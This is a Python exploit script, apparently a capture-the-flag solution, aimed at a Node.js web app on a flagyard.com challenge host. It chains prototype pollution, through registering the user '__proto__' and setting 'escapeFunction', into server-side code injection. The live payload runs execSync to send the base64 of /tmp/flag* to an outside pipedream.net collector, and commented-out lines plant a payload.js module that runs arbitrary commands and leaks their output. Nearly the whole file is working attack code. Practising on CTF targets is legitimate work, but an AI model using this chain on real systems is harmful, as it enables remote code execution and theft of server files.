#!/usr/bin/python3

import requests

url = "http://a64d46184d37842caf744.playat.flagyard.com"

s = requests.Session()

print(s.post(f"{url}/register", data = {"username": "__proto__", "password": "__proto__"}).text)

print(s.post(f"{url}/address", data = {
    "addressId": "client",
    "Fulladdress": "1"
}).text)

print(s.post(f"{url}/address", data = {
    "addressId": "escapeFunction",
    "Fulladdress": '''process.mainModule.require('child_process').execSync('curl https://engpo0slejpol.x.pipedream.net/$(cat /tmp/flag*|base64 -w0)');'''
}).text)

#print(s.post(f"{url}/address", data = {
#    "addressId": "escapeFunction",
#    "Fulladdress": '''process.mainModule.require("fs").writeFileSync('./payload.js', "function RCE( key ){ \n const result = process.mainModule.require('child_process').execSync(`${key}`); \n throw new Error(`Result leak from Error: ${result.toString()}`); \n}\n module.exports = RCE;");'''
#}).text)

print(s.get(f"{url}/").text)

#print(s.post(f"{url}/address", data = {
#    "addressId": "escapeFunction",
#    "Fulladdress": '''process.mainModule.require("./payload.js")("ls -la /");'''
#}).text)
#
#
#print(s.get(f"{url}/").text)

s.close()